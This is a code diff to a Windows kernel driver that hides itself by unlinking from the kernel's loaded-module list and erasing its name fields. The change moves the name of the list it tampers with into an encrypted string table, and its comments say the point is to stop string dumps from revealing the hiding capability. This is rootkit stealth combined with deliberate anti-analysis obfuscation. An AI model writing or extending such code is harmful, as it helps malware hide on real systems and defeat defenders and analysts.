@@ -1,6 +1,7 @@
 #include <ntddk.h>
 #include <stdint.h>
 #include "debug.h"
+#include "common/yghv_strtab.h"
 
 /*
  * minimal stealth. Unlink from PsLoadedModuleList.
@@ -30,10 +31,27 @@ static void yghv_unlink_module(PDRIVER_OBJECT DriverObject) {
     PKLDR_DATA_TABLE_ENTRY entry;
     PLIST_ENTRY le;
 
-    RtlInitUnicodeString(&funcName, L"PsLoadedModuleList");
+    /*
+     * 9.590: the name comes from the encrypted table, not a literal.
+     *
+     * The literal was the last place a plaintext export name sat in this image,
+     * and it is the least defensible one: "strings x.sys" showing the exact
+     * export the driver resolves is enough to describe the module-unlink
+     * capability without reading a single instruction.
+     */
+    {
+        WCHAR wide[YGHV_STR_MAX_CHARS];
+
+        if (!yghv_str_get_w(YGHV_SID_PSLOADEDMODULELIST, (unsigned short *)wide,
+                            YGHV_STR_MAX_CHARS)) {
+            LOG_ERROR("yghv_unlink: module-list name does not decode");
+            return;
+        }
+        RtlInitUnicodeString(&funcName, wide);
+    }
     head = (PLIST_ENTRY)MmGetSystemRoutineAddress(&funcName);
     if (!head) {
-        LOG_INFO("yghv_unlink: PsLoadedModuleList not found");
+        LOG_INFO("yghv_unlink: module-list export not found");
         return;
     }
 
@@ -51,7 +69,7 @@ static void yghv_unlink_module(PDRIVER_OBJECT DriverObject) {
             RtlZeroMemory(&entry->BaseDllName, sizeof(entry->BaseDllName));
             RtlZeroMemory(&entry->FullDllName, sizeof(entry->FullDllName));
 
-            LOG_INFO("yghv_unlink: removed from PsLoadedModuleList");
+            LOG_INFO("yghv_unlink: removed from the load-order list");
             return;
         }
     }
